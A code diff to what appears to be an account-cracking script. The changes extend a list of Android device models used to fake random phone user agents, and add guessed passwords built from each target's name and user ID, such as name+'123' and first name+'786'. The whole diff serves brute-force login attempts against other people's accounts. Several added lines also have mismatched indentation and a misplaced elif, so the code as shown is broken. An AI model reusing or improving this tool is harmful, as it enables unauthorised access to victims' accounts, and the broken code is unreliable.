@@ -129,7 +129,7 @@ def ua_rozha():
     rr = random.randint
     rc = random.choice
     real = str(rc(["SM-J120H","SM-J120F","SM-J120M","SM-J111M","SM-J111F","SM-J110H","SM-J110G","SM-J110F","SM-J110M","SM-J105H","SM-J105Y","SM-J105B","SM-J106H","SM-J106F","SM-J106B","SM-J106M","SM-J200F","SM-J200M","SM-J200G","SM-J200H","SM-J200F","SM-J200GU","SM-J260M","SM-J260F","SM-J260MU","SM-J260F","SM-J260G","SM-J200BT","SM-G532G","SM-G532M","SM-G532MT"]))
-    me = str(rc(["vivo 1939", "vivo 1907", "vivo 1820", "vivo Y55A", "vivo Xplay6", "vivo Y66i A", "V1941A", "V2043", "V2061", "V1824A", "V2047", "V2020CA", "V2156A", "V2241A", "V1924A", "vivo 1907", "vivo 1909"]))
+    me = str(rc(["vivo 1939", "vivo 1907", "vivo 1820", "vivo Y55A", "vivo Xplay6", "vivo Y66i A", "V1941A", "V2043", "V2061"]))
     com = str(rc(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C"]))
     comi = str(rc(["en_GB","en_US","ar_LY","ru_RU"]))
     dpi = str(rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"]))
@@ -640,6 +640,10 @@ def atur_sandi():
 				user,nama = akun.split('|')[0], akun.split('|')[1].lower()
 				dp = nama.split(' ')[0]
 				full = nama.replace(" ", "")
+				dp2 = nama.split(' ')[1] if len(nama.split(' ')) > 1 else None
+                fn = nama.replace(' ', '')
+                res1 = " ".join(re.split("[^a-zA-Z]*", user)).replace(" ","")
+                user2 = res1.lower()
 				if apa in ['1','01']:
 					if len(dp)<3 or len(nama)<5:
 						pwx = [nama.replace(' ','')+'123']
@@ -653,8 +657,10 @@ def atur_sandi():
 				elif apa in ['3','03']:
 					if len(dp)<3 or len(nama)<5:
 						pwx = [nama.replace(' ','')+'123',nama.replace(' ','')+'12345']
+				elif dp2 != None:
+                        pwx = [nama,nama.replace(' ',''),dp+'123',dp+'1234',dp+'1',dp+'1122',full+'123',full+'1234',full+'12345',dp+'12',full+'1',full+'12',full+'1122',dp+'12345',dp+'786',user2+'12345',user2+'1234',user2+'123']
 					else:
-						pwx = [nama,nama.replace(' ',''),dp+'123',dp+'1234',dp+'1',dp+'1122',full+'123',full+'1234',full+'12345',dp+'12',full+'1',full+'12',full+'1122',dp+'12345',dp+'786']
+						pwx = [nama,nama.replace(' ',''),dp+'123',dp+'1234',dp+'1',dp+'1122',full+'123',full+'1234',full+'12345',dp+'12',full+'1',full+'12',full+'1122',dp+'12345',dp+'786',user2+'12345',user2+'1234',user2+'123']
 				elif apa in ['4','04']:
 					if len(dp)<3 or len(nama)<5:
 						pwx = manual
